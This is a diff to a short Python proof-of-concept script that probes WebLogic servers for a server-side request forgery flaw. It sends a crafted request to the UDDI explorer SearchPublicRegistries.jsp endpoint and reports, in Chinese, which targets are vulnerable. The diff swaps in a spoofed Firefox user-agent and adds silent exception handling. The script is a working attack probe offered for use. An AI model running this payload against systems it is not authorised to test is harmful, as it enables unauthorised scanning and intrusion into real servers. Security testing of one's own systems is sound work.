@@ -3,7 +3,7 @@
 
 import requests
 
-headers = {'user-agent': 'ceshi/0.0.1'}
+headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0'}
 
 
 def poc(url):
@@ -11,10 +11,13 @@ def poc(url):
         url = 'http://' + url
     payload = "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
     url = url + payload
-    req = requests.get(url, timeout=10, verify=False)
-    if "weblogic.uddi.client.structures.exception.XML_SoapException" in req.text and "IO Exception on sendMessage" not in req.text:
-        result = "目标存在 WebLogic ssrf : %s" % url
-        return result
+    try:
+        req = requests.get(url, timeout=10, headers=headers, verify=False)
+        if "weblogic.uddi.client.structures.exception.XML_SoapException" in req.text and "IO Exception on sendMessage" not in req.text:
+            result = "目标WebLogic存在 ssrf 漏洞 : %s" % url
+            return result
+    except:
+        pass
 
 
 if __name__ == "__main__":
